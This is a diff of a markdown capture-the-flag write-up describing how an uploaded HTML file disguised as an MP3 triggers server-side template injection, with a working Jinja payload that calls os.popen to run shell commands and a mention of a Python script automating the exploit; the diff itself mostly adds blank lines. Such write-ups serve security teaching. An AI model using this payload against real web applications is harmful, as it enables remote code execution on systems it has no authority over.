@@ -169,14 +169,18 @@ We can render our malicious.mp3.html by passing the page parameter like this:
 ```
 http://your-instance-url/?page=malicious.mp3
 ```
+
 This will render our HTML, and the result of 7*7 (which is 49) will be displayed in the <textarea> field, confirming that SSTI is successfully triggered.
+
 ---
+
 ## Final Payload for SSTI
 
 Our final payload for SSTI will be:
 ```html
 {{config.__class__.__init__.__globals__['os'].popen('ls -l /app').read()}}
 ```
+
 This payload will achieve Remote Code Execution (RCE) using SSTI.
 
 To execute this, simply replace the value and re-upload the file. Here is how the updated HTML file looks:
@@ -191,12 +195,17 @@ To execute this, simply replace the value and re-upload the file. Here is how th
 </body>
 </html>
 ```
+
 After uploading, access the payload by visiting:
+
 ```
 http://your-instance-url/?page=malicious.mp3
 ```
+
 This will render the updated HTML and execute the command, showing the output of ls -la in the <textarea> field, thus achieving RCE.
+
 ---
+
 ## Python Automated Script
 
 I wrote a Python script to automate the entire process for retrieving the flag.
@@ -267,8 +276,10 @@ def access_payload():
 if __name__ == "__main__":
     upload_file()
     access_payload()
+
 ```
 This script automates the process of uploading the malicious file, triggering the SSTI vulnerability, and retrieving the flag. Let me know if you need further assistance!
+
 ---
 ### Contact me: 
 
